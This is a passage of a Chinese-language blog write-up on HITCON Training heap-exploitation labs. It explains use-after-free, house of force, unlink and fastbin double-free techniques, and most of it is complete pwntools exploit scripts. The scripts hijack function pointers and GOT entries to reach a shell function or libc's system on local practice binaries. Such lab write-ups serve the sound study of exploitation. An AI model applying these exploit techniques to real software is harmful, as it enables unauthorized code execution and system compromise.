+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct note &#123;</span><br><span class="line">	void (*printnote)();</span><br><span class="line">	char *content ;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>还喜闻乐见的有malloc任意size的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void add_note()&#123;</span><br><span class="line">...</span><br><span class="line">            read(0,buf,8);</span><br><span class="line">            size = atoi(buf);</span><br><span class="line">            notelist[i]-&gt;content = (char *)malloc(size);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>连system都给了2333<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void magic()&#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>那没啥话说，想办法让我们的content建立在之前的note chunk上就行了。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">'./hacknote'</span>)</span><br><span class="line">bin = ELF(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(<span class="string">"1"</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(str(size))</span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_note</span><span class="params">(index)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(<span class="string">"2"</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(<span class="string">"3"</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    cn.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">24</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add_note(<span class="number">24</span>,<span class="string">'bbb'</span>)</span><br><span class="line">add_note(<span class="number">24</span>,<span class="string">'ccc'</span>)</span><br><span class="line"><span class="comment">#content的大小不等于16（note的大小），是为了等会分配16bytes的content不会被分配到之前的content的bin上，而是分配到note的bin上</span></span><br><span class="line"></span><br><span class="line">del_note(<span class="number">0</span>)</span><br><span class="line">del_note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">8</span>,p32(bin.symbols[<span class="string">'magic'</span>]))</span><br><span class="line"></span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="lab11-1"><a href="#lab11-1" class="headerlink" title="lab11-1"></a>lab11-1</h2><p>这题考察house of force的利用，house of force的细节这里就不说了。</p>
+<p>一般步骤：<br>1.把topchunk的size改大（一般改为-1，即32位下的0xffffffff，64位下的0xffffffffffffffff）以便能把chunk建在内存的任意一个地点。<br>2.建立一个evil_size大小的chunk,使建完这个chunk后av-&gt;top会指向我们想要的target-0x8/0x10(chunk_header_size)<br>3.再次建立chunk，会建在之前av-&gt;top所指的地方，就是我们的target了。</p>
+<p>这题程序一开建了一个含有程序指针的chunk，并且程序结束会调用这个chunk中的程序指针。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">struct box&#123;</span><br><span class="line">	void (*hello_message)();</span><br><span class="line">	void (*goodbye_message)();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">bamboo = malloc(sizeof(struct box));</span><br><span class="line">bamboo-&gt;hello_message = hello_message;</span><br><span class="line">bamboo-&gt;goodbye_message = goodbye_message ;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">case 5:</span><br><span class="line">	bamboo-&gt;goodbye_message();</span><br><span class="line">	exit(0);</span><br><span class="line">	break;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>我们的目的就是把它改写成我们的magic函数。</p>
+<p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">additem</span><span class="params">(length,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx,length,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line">additem(<span class="number">0x100</span>,<span class="string">"ddaa"</span>)</span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x110</span>,<span class="string">"a"</span>*<span class="number">0x100</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">additem(-(<span class="number">0x10</span>+<span class="number">0x10</span>)-(<span class="number">0x10</span>+<span class="number">0x100</span>)-(<span class="number">0x10</span>),<span class="string">"dada"</span>)<span class="comment">#evil_size</span></span><br><span class="line">additem(<span class="number">0x20</span>,p64(magic)*<span class="number">2</span>)<span class="comment">#change ptr here!!</span></span><br><span class="line">r.sendline(<span class="string">'5'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="lab11-2"><a href="#lab11-2" class="headerlink" title="lab11-2"></a>lab11-2</h2><p>这题考察unlink的用法。</p>
+<p>unlink的具体原理这边就不说了。</p>
+<p>主要是通过unlink把chunk0改到chunklist的附近（原指向chunk0的指针现在指向了chunklist附近），从而向chunk0写内容能把chunk1改到任意的位置，print chunk1就变成了任意地址读，write chunk1就变成了任意地址写。</p>
+<p><strong>exp_cat_flag_using_magic</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">cn = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">bin = ELF(<span class="string">'./bamboobox'</span>)</span><br><span class="line"></span><br><span class="line">itemlist = <span class="number">0x00000000006020C0</span></span><br><span class="line">p_chunk0 = itemlist+<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_item</span><span class="params">(length,name)</span>:</span></span><br><span class="line">	cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'the length of item name:'</span>)</span><br><span class="line">	cn.sendline(str(length))</span><br><span class="line">	cn.recvuntil(<span class="string">'the name of item:'</span>)</span><br><span class="line">	cn.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_item</span><span class="params">(index,length,name)</span>:</span></span><br><span class="line">	cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'the index of item:'</span>)</span><br><span class="line">	cn.sendline(str(index))</span><br><span class="line">	cn.recvuntil(<span class="string">'the length of item name:'</span>)</span><br><span class="line">	cn.sendline(str(length))</span><br><span class="line">	cn.recvuntil(<span class="string">'new name of the item:'</span>)</span><br><span class="line">	cn.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_item</span><span class="params">(index)</span>:</span></span><br><span class="line">	cn.sendline(<span class="string">'4'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'the index of item:'</span>)</span><br><span class="line">	cn.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_item</span><span class="params">()</span>:</span></span><br><span class="line">	cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">	data = cn.recvuntil(<span class="string">'----------------------------'</span>)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">add_item(<span class="number">256</span>,<span class="string">'aaaaaaaa'</span>)<span class="comment">#chunk0</span></span><br><span class="line">add_item(<span class="number">256</span>,<span class="string">'bbbbbbbb'</span>)<span class="comment">#chunk1</span></span><br><span class="line">add_item(<span class="number">256</span>,<span class="string">'cccccccc'</span>)<span class="comment">#chunk2</span></span><br><span class="line"></span><br><span class="line">pay = p64(<span class="number">0</span>)+p64(<span class="number">256</span>+<span class="number">1</span>)+p64(p_chunk0<span class="number">-0x18</span>)+p64(p_chunk0<span class="number">-0x10</span>)</span><br><span class="line">pay += <span class="string">'A'</span>*(<span class="number">256</span><span class="number">-4</span>*<span class="number">8</span>)</span><br><span class="line">pay += p64(<span class="number">256</span>)+p64(<span class="number">256</span>+<span class="number">0x10</span>) + <span class="string">'test'</span></span><br><span class="line"></span><br><span class="line">change_item(<span class="number">0</span>,len(pay),pay)</span><br><span class="line"></span><br><span class="line">remove_item(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pay2 = <span class="string">'\x00'</span>*<span class="number">0x18</span> + p64(p_chunk0<span class="number">-0x18</span>) + p64(<span class="number">0</span>) + p64(bin.got[<span class="string">'puts'</span>])</span><br><span class="line">change_item(<span class="number">0</span>,len(pay2),pay2)</span><br><span class="line"></span><br><span class="line">change_item(<span class="number">1</span>,<span class="number">16</span>,p64(bin.symbols[<span class="string">'magic'</span>]))</span><br><span class="line">flag = cn.recv()</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"the flag is : "</span>+flag)</span><br></pre></td></tr></table></figure>
+<p><strong>exp_get_shell</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">cn = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">bin = ELF(<span class="string">'./bamboobox'</span>)</span><br><span class="line"></span><br><span class="line">itemlist = <span class="number">0x00000000006020C0</span></span><br><span class="line">p_chunk0 = itemlist+<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_item</span><span class="params">(length,name)</span>:</span></span><br><span class="line">	cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'the length of item name:'</span>)</span><br><span class="line">	cn.sendline(str(length))</span><br><span class="line">	cn.recvuntil(<span class="string">'the name of item:'</span>)</span><br><span class="line">	cn.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_item</span><span class="params">(index,length,name)</span>:</span></span><br><span class="line">	cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'the index of item:'</span>)</span><br><span class="line">	cn.sendline(str(index))</span><br><span class="line">	cn.recvuntil(<span class="string">'the length of item name:'</span>)</span><br><span class="line">	cn.sendline(str(length))</span><br><span class="line">	cn.recvuntil(<span class="string">'new name of the item:'</span>)</span><br><span class="line">	cn.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_item</span><span class="params">(index)</span>:</span></span><br><span class="line">	cn.sendline(<span class="string">'4'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'the index of item:'</span>)</span><br><span class="line">	cn.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_item</span><span class="params">()</span>:</span></span><br><span class="line">	cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'0 :'</span>)</span><br><span class="line">	data = cn.recvuntil(<span class="string">'----------------------------'</span>)</span><br><span class="line">	<span class="keyword">return</span> data[:-len(<span class="string">'----------------------------'</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">	pay = <span class="string">'\x00'</span>*<span class="number">0x18</span> + p64(p_chunk0<span class="number">-0x18</span>) + p64(<span class="number">0</span>) + p64(addr)</span><br><span class="line">	change_item(<span class="number">0</span>,len(pay),pay)</span><br><span class="line">	cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'1 : '</span>)</span><br><span class="line">	data = cn.recvuntil(<span class="string">'2 : '</span>)[:<span class="number">-4</span>]</span><br><span class="line">	log.info(hex(addr) + <span class="string">'-&gt;'</span> + (data+<span class="string">'\x00'</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">	<span class="keyword">return</span> (data+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">add_item(<span class="number">256</span>,<span class="string">'aaaaaaaa'</span>)<span class="comment">#chunk0</span></span><br><span class="line">add_item(<span class="number">256</span>,<span class="string">'bbbbbbbb'</span>)<span class="comment">#chunk1</span></span><br><span class="line">add_item(<span class="number">256</span>,<span class="string">'cccccccc'</span>)<span class="comment">#chunk2</span></span><br><span class="line"></span><br><span class="line">pay = p64(<span class="number">0</span>)+p64(<span class="number">256</span>+<span class="number">1</span>)+p64(p_chunk0<span class="number">-0x18</span>)+p64(p_chunk0<span class="number">-0x10</span>)</span><br><span class="line">pay += <span class="string">'A'</span>*(<span class="number">256</span><span class="number">-4</span>*<span class="number">8</span>)</span><br><span class="line">pay += p64(<span class="number">256</span>)+p64(<span class="number">256</span>+<span class="number">0x10</span>) + <span class="string">'test'</span></span><br><span class="line"></span><br><span class="line">change_item(<span class="number">0</span>,len(pay),pay)</span><br><span class="line"></span><br><span class="line">remove_item(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pay2 = <span class="string">'\x00'</span>*<span class="number">0x18</span> + p64(p_chunk0<span class="number">-0x18</span>) + p64(<span class="number">0</span>)+ p64(bin.got[<span class="string">'atoi'</span>])</span><br><span class="line">change_item(<span class="number">0</span>,len(pay2),pay2)</span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line">d = DynELF(leak,elf = bin)</span><br><span class="line">system = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line">log.success(<span class="string">"find system = "</span> + hex(system))</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pay2 = <span class="string">'\x00'</span>*<span class="number">0x18</span> + p64(p_chunk0<span class="number">-0x18</span>) + p64(<span class="number">0</span>) + p64(bin.got[<span class="string">'atoi'</span>])</span><br><span class="line">change_item(<span class="number">0</span>,len(pay2),pay2)</span><br><span class="line"></span><br><span class="line">change_item(<span class="number">1</span>,<span class="number">16</span>,p64(system))</span><br><span class="line">cn.sendline(<span class="string">'$0'</span>)</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="lab12"><a href="#lab12" class="headerlink" title="lab12"></a>lab12</h2><p>这题考察 fastbin attack，严格来说是fastbin dup。就是fastbin的double free（个人理解）</p>
+<p>由于fastbin在free时只有这样一条检验是否double free</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/hitcon_training_b23fc4f0b4575456d17d035aebf73264.png" alt=""></p>
+<p>所以，只要不要<strong>连续</strong>两次释放同一块内存就行，比如<code>free(p1);free(p2);free(p1);</code>就不会触发double free。</p>
+<p>然后连续两次malloc取走p1,p2，此时p1已经被取走，但由于之前double free同时也还留在fastbin list中，就可以对p1中的fd进行修改使fastbin list中的p1出现fd中的bin。</p>
+<p>但这个fakebin的size必须和当前的idx满足一定关系（idx+[0,7]），否则是malloc不出来的。</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/hitcon_training_a46533b9b3adb7a091513698fd0ffcc6.png" alt=""></p>
+<p>而这个fastbin_index是这样定义的</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/hitcon_training_230a2428a0920ba8ff575f047dcd096f.png" alt=""></p>
+<p>实际上是一个unsigned int，也就是说在x64上（假设此时idx为0x20），我们的size的高位不是全要为零，而是<code>0x????????00000020 + [0,7]</code>，高4字节是可以任意的。比如0xffffffff00000023就是可以的。</p>
+<p>我们的目的是修改got表到magic函数，所以通过fastbin_dup我们把chunk建在got表前面某个恰当的位置。比如0x601ffa，因为此时的size很恰当。</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/hitcon_training_43e7b4b8a3170e430a30808c068b8bb1.png" alt=""></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./secretgarden'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raiseflower</span><span class="params">(length,name,color)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(color)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400c7b</span></span><br><span class="line">fake_chunk = <span class="number">0x601ffa</span></span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"da"</span>,<span class="string">"red"</span>)<span class="comment">#0</span></span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"da"</span>,<span class="string">"red"</span>)<span class="comment">#1</span></span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,p64(fake_chunk),<span class="string">"blue"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"da"</span>,<span class="string">"red"</span>)</span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"da"</span>,<span class="string">"red"</span>)</span><br><span class="line"></span><br><span class="line">raiseflower(<span class="number">0x50</span>,<span class="string">"a"</span>*<span class="number">6</span> + p64(<span class="number">0</span>) + p64(magic)*<span class="number">2</span> ,<span class="string">"red"</span>)<span class="comment">#malloc in fake_chunk</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="lab13"><a href="#lab13" class="headerlink" title="lab13"></a>lab13</h2><p>考察Extend the chunk。</p>
+<p>这题用到了一个trick。</p>
+<p>源代码中edit_heap函数中有这么一段：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(heaparray[idx])&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Content of heap : "</span>);</span><br><span class="line">	read_input(heaparray[idx]-&gt;content,heaparray[idx]-&gt;size+<span class="number">1</span>);<span class="comment">//size +1 overflow</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"No such heap !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
